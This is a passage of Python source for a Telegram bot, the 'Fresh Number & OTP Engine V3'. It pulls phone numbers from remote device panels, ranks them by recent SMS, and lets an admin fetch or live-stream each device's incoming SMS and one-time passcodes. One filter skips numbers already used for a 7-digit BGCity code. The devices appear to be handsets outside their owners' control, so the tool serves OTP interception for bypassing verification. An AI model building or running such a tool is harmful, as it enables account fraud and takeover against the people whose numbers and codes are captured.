                     {"text": "📩 Fetch Latest 5 Msg", "callback_data": f"fetch_{tid}"}],
                    [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                     {"text": "📋 My Claimed Numbers", "callback_data": "menu_claimed"}]
                ]
            }
            await self.send_msg(msg, reply_markup=ikb)

        elif data.startswith("stream_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired. Tap <b>⚡ Extract Fresh Number</b> for next number.")
                return

            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()

            self.active_stream_task = asyncio.create_task(self.stream_device_otps(target))

            ikb = {
                "inline_keyboard": [
                    [{"text": "📩 Fetch Latest 5 Msg", "callback_data": f"fetch_{tid}"}],
                    [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"},
                     {"text": "⏹ Stop Stream", "callback_data": "stop_stream"}]
                ]
            }
            await self.send_msg(
                f"🚀 <b>Listening Live for</b> <code>{html.escape(target['phone'])}</code>...\n"
                f"Any incoming SMS / OTP arriving will be posted here instantly!",
                reply_markup=ikb
            )

        elif data.startswith("fetch_"):
            tid = data.split("_", 1)[1]
            target = self.target_registry.get(tid)
            if not target:
                await self.send_msg("⚠️ Session expired. Tap <b>⚡ Extract Fresh Number</b> for next number.")
                return

            await self.send_msg(f"⏳ <b>Fetching latest messages for</b> <code>{html.escape(target['phone'])}</code>...")
            report = await self.fetch_latest_5_messages(target["panel"], target["cid"], target["phone"])

            ikb = {
                "inline_keyboard": [
                    [{"text": "⚡ Start Live Stream", "callback_data": f"stream_{tid}"}],
                    [{"text": "🔄 Next Rank Number", "callback_data": "next_fresh"}]
                ]
            }
            await self.send_msg(report, reply_markup=ikb)

    async def handle_text_message(self, text: str, sender_id: str):
        if sender_id != ADMIN_ID:
            await self.send_msg(f"⛔ Unauthorized user ({sender_id}). Locked to Admin.", chat_id=sender_id)
            return

        cmd = text.strip()

        if cmd in ("/start", "ℹ️ Bot Status"):
            stream_info = f"Active ({self.active_stream_target['phone']})" if self.active_stream_target else "Idle"
            bigbon_info = "🟢 ON (Excluding 7-Digit BGCity OTPs)" if self.bigbon_filter_active else "⚪ OFF"
            status_text = (
                f"🤖 <b>ULTRA-PREMIUM FRESH NUMBER & OTP ENGINE (V3)</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"👑 <b>Admin ID:</b> <code>{ADMIN_ID}</code>\n"
                f"⚡ <b>Pre-warmed Buffer:</b> <code>{len(self.prewarmed_queue)} Fresh Numbers Ready</code>\n"
                f"📋 <b>Claimed Numbers Pool:</b> <code>{len(self.claimed_numbers)} Active</code>\n"
                f"🌐 <b>Total Panels Loaded:</b> <code>{len(self.panels)}</code>\n"
                f"🏆 <b>Ranked Devices Cached:</b> <code>{len(self.ranked_devices)}</code>\n"
                f"⚡ <b>Live Stream Status:</b> <code>{stream_info}</code>\n"
                f"🎯 <b>Bigbon Filter:</b> <code>{bigbon_info}</code>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"Tap <b>⚡ Extract Fresh Number</b> for instant sub-second delivery!"
            )
            await self.send_msg(status_text, reply_markup=self.get_main_keyboard())

        elif cmd in ("🟢 Bigbon: ON", "⚪ Bigbon: OFF", "🎯 Bigbon", "/bigbon", "bigbon"):
            self.bigbon_filter_active = not self.bigbon_filter_active
            save_bigbon_state(self.bigbon_filter_active)
            # Clear prewarmed queue to enforce new filter rules
            self.prewarmed_queue.clear()
            kb = self.get_main_keyboard()
            if self.bigbon_filter_active:
                msg = (
                    "🟢 <b>BIGBON FILTER ACTIVATED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "✅ Numbers that previously received a <b>7-digit OTP from BGCity</b> will now be <b>EXCLUDED</b>.\n"
                    "🎯 Only fresh numbers with ZERO prior 7-digit BGCity OTPs will be assigned!"
                )
            else:
                msg = (
                    "⚪ <b>BIGBON FILTER DEACTIVATED</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━━━\n"
                    "Normal mode restored. All numbers will now be assigned without BGCity filtering."
                )
            await self.send_msg(msg, reply_markup=kb)

        elif cmd.startswith("⚡ Extract Fresh Number") or cmd == "/extract":
            await self.handle_extract_number()

        elif cmd in ("📋 My Claimed Numbers", "/claimed", "claimed"):
            await self.render_claimed_numbers_menu()

        elif cmd in ("📊 Live Rank Top 10", "/rank"):
            if not self.ranked_devices:
                await self.send_msg("🔍 <b>Ranking devices... Please wait.</b>")
                await self.scan_and_rank_all_devices()

            if not self.ranked_devices:
                await self.send_msg("⚠️ <b>No active ranked devices found.</b>")
                return

            filter_note = "\n🎯 <i>Filter: Bigbon ON (Excluding 7D BGCity OTPs)</i>" if self.bigbon_filter_active else ""
            lines = [f"🏆 <b>TOP 10 ACTIVE DEVICES (RANKED BY RECENT SMS)</b>{filter_note}\n━━━━━━━━━━━━━━━━━━━━━━"]
            count = 0
            for dev in list(self.ranked_devices):
                if count >= 10:
                    break
                phone = dev.get("phone")
                if not phone:
                    phone = await self.resolve_device_real_phone(dev["panel"], dev["cid"])
                    if phone:
                        dev["phone"] = phone
                    else:
                        continue

                # Bigbon filter in Live Rank
                if self.bigbon_filter_active:
                    has_7d = await self.device_has_bgcity_7digit_otp(dev["panel"], dev["cid"])
                    if has_7d:
                        continue

                rel, exact = format_msg_time(dev["last_msg_ts"])
                used_tag = "[USED] " if dev["phone"] in self.used_numbers else ""
                count += 1
                lines.append(f"<b>{count}.</b> {used_tag}<code>{dev['phone']}</code>\n   🕒 Last SMS: <code>{exact} ({rel})</code>")

            lines.append("━━━━━━━━━━━━━━━━━━━━━━\nTap <b>⚡ Extract Fresh Number</b> to assign the top device.")
            await self.send_msg("\n".join(lines), reply_markup=self.get_main_keyboard())

        elif cmd in ("🔄 Re-Scan Devices", "/rescan"):
            await self.send_msg("🔄 <b>Re-scanning all panels and prewarming fresh numbers...</b>")
            self.prewarmed_queue.clear()
            await self.scan_and_rank_all_devices()
            await self.send_msg(f"✅ <b>Rank Sweep Complete!</b> {len(self.ranked_devices)} devices ranked top-to-bottom.", reply_markup=self.get_main_keyboard())

        elif cmd in ("⏹ Stop Active Stream", "/stop"):
            if self.active_stream_task and not self.active_stream_task.done():
                self.active_stream_task.cancel()
                self.active_stream_task = None
                await self.send_msg("⏹ <b>Live OTP Stream stopped.</b>", reply_markup=self.get_main_keyboard())
            else:
                await self.send_msg("ℹ️ <b>No active stream is currently running.</b>", reply_markup=self.get_main_keyboard())

    # ── Telegram Polling Loop ──
    async def run(self):
        print("=" * 65)
        print("  ⚡ TELEGRAM ULTRA-PREMIUM FRESH NUMBER & OTP STREAM BOT (V3)")
        print(f"  Bot Token : {BOT_TOKEN[:15]}... ({TG_API_BASE})")
        print(f"  Admin ID  : {ADMIN_ID}")
        print(f"  Panels    : {len(self.panels)} loaded from {PANELS_FILE}")
        print("=" * 65)

        # Start background prewarmer task
        asyncio.create_task(self.background_prewarmer())

        # Notify Admin on Telegram
        welcome = (
            "🚀 <b>ULTRA-PREMIUM OTP BOT V3 ONLINE!</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"👑 <b>Admin:</b> <code>{ADMIN_ID}</code>\n"
            f"⚡ <b>Instant Delivery:</b> <code>Enabled (&lt;50ms Response)</code>\n"
            f"🟢 <b>Vitality Engine:</b> <code>Live Device Health &amp; Battery Status</code>\n"
            f"📋 <b>Claimed Pool:</b> <code>Active (Never lose numbers again)</code>\n"
            f"🎯 <b>Bigbon Filter:</b> <code>{'🟢 ON' if self.bigbon_filter_active else '⚪ OFF'}</code>\n\n"
            "Tap <b>⚡ Extract Fresh Number</b> to get an instant verified live number!"
        )
        await self.send_msg(welcome, reply_markup=self.get_main_keyboard())

        # ── Render Web Service Port Binding (Health Check) ──
        port = int(os.environ.get("PORT", "0"))
        if port > 0:
            from aiohttp import web
            async def health_handler(request):
                return web.Response(text="Bot is running!")
            app = web.Application()
            app.router.add_get("/", health_handler)
            app.router.add_get("/healthz", health_handler)
            runner = web.AppRunner(app)
            await runner.setup()
            site = web.TCPSite(runner, "0.0.0.0", port)
            await site.start()
            print(f"[*] Render Web Health Server running on 0.0.0.0:{port}")

        s = await self.get_session()
        print("[*] Telegram polling active. Waiting for commands...")

        while True:
            try:
                url = f"{TG_API_BASE}/getUpdates?offset={self.last_update_id + 1}&timeout=15"
                async with s.get(url, timeout=25.0) as r:
                    if r.status == 200:
                        res = await r.json(content_type=None)
                        if res.get("ok"):
                            for upd in res.get("result", []):
                                self.last_update_id = upd.get("update_id", self.last_update_id)

                                if "callback_query" in upd:
                                    asyncio.create_task(self.handle_callback_query(upd["callback_query"]))
                                elif "message" in upd:
                                    msg = upd["message"]
                                    sender_id = str(msg.get("from", {}).get("id"))
                                    text = msg.get("text", "")
                                    if text:
                                        asyncio.create_task(self.handle_text_message(text, sender_id))
            except asyncio.CancelledError:
                break
            except Exception as e:
                print(f"[loop warn] {e}")
                await asyncio.sleep(2.0)


def main():
    bot = TelegramFreshBot()
    try:
        asyncio.run(bot.run())
    except KeyboardInterrupt:
        print("\n[!] Bot stopped by user.")


if __name__ == "__main__":
    main()
